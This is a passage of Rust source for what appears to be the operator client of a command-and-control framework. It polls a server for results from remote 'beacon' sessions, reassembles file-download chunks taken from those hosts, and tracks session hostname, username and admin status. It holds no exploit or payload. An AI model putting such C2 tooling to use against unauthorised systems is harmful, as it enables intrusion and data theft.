    token: &Option<String>,
) -> anyhow::Result<Vec<ResultView>> {
    Ok(authed(c.get(format!("{server}/api/results")).query(&[("session", session)]), token)
        .send().await?.json().await?)
}

/// Poll a single (non-file) task. Returns `Done(None)` if no matching result yet.
async fn poll_result(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    task_id: u64,
    token: &Option<String>,
) -> PollOutcome {
    let rs = match fetch_results(c, server, session, token).await {
        Ok(rs) => rs,
        Err(e) => return PollOutcome::Err(e.to_string()),
    };
    match rs.into_iter().find(|r| r.task_id == task_id) {
        Some(r) => PollOutcome::Done(match r.kind.as_str() {
            "output" => Some(r.text),
            "ok" => Some(String::new()),
            "error" => Some(format!("[error] {}", r.text)),
            other => Some(format!("[{other}] {}", r.text)),
        }),
        None => PollOutcome::Pending,
    }
}

/// Poll file chunks for a download task. Accumulates into `chunks` until `eof`.
async fn poll_file_chunks(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    task_id: u64,
    chunks: &mut Vec<(u32, Vec<u8>)>,
    saw_eof: &mut bool,
    token: &Option<String>,
) -> PollOutcome {
    let rs = match fetch_results(c, server, session, token).await {
        Ok(rs) => rs,
        Err(e) => return PollOutcome::Err(e.to_string()),
    };
    for r in rs {
        if r.task_id != task_id || r.kind != "file" {
            continue;
        }
        let seq = r.seq.unwrap_or(0);
        // Don't silently coerce a malformed-hex chunk into empty bytes — that
        // would produce a corrupt download with a zero-filled hole and no signal
        // to the operator. Surface it as a per-download error instead. (client-cli
        // has no logger, so the visible-error path — not a log line — is how we
        // stay non-silent without corrupting the TUI.) The hex is server-produced
        // and TLS-protected, so this is rare, but silent corruption is the wrong
        // failure mode for a file transfer.
        let data = match r.data_hex.as_deref().map(hex::decode).transpose() {
            Ok(Some(d)) => d,
            Ok(None) => Vec::new(),
            Err(e) => {
                return PollOutcome::Err(format!(
                    "download chunk seq {} has malformed data_hex ({e}); \
                     aborting to avoid a silently-corrupt file",
                    r.seq.unwrap_or(0)
                ));
            }
        };
        if r.eof.unwrap_or(0) == 1 {
            *saw_eof = true;
        }
        if !chunks.iter().any(|(s, _)| *s == seq) {
            chunks.push((seq, data));
        }
    }
    if *saw_eof {
        PollOutcome::Done(None)
    } else {
        PollOutcome::Pending
    }
}

// ---- helpers ----

fn short(s: &str) -> &str {
    &s[..s.len().min(8)]
}

fn session_signature(list: &[SessionView]) -> String {
    let mut s = String::new();
    for v in list {
        s.push_str(&v.id);
        s.push('|');
        s.push_str(&v.hostname);
        s.push('|');
        s.push_str(&v.username);
        s.push('|');
        s.push_str(&format!("{}|{}", v.is_admin, v.pending));
        s.push(';');
    }
    s
}

fn log_push(buf: &mut Vec<LogLine>, text: &str, level: Level) {
    buf.push(LogLine { text: text.to_string(), level });
    if buf.len() > LOG_BUFFER_CAP {
        let drop = buf.len() - LOG_BUFFER_CAP;
        buf.drain(..drop);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn log_push_caps() {
        let mut buf = Vec::new();
        for i in 0..(LOG_BUFFER_CAP + 10) {
            log_push(&mut buf, &i.to_string(), Level::Info);
        }
        assert_eq!(buf.len(), LOG_BUFFER_CAP);
    }

    #[test]
    fn signature_detects_change() {
        let mk = |id: &str, pend: usize| SessionView {
            id: id.into(), hostname: "h".into(), username: "u".into(), os: String::new(),
            is_admin: 0, pending: pend, beacon_id: 0, arch: 0, pid: 0,
            ..Default::default()
        };
        let a = vec![mk("s1", 1)];
        assert_ne!(session_signature(&a), session_signature(&[mk("s1", 2)]));
    }
}
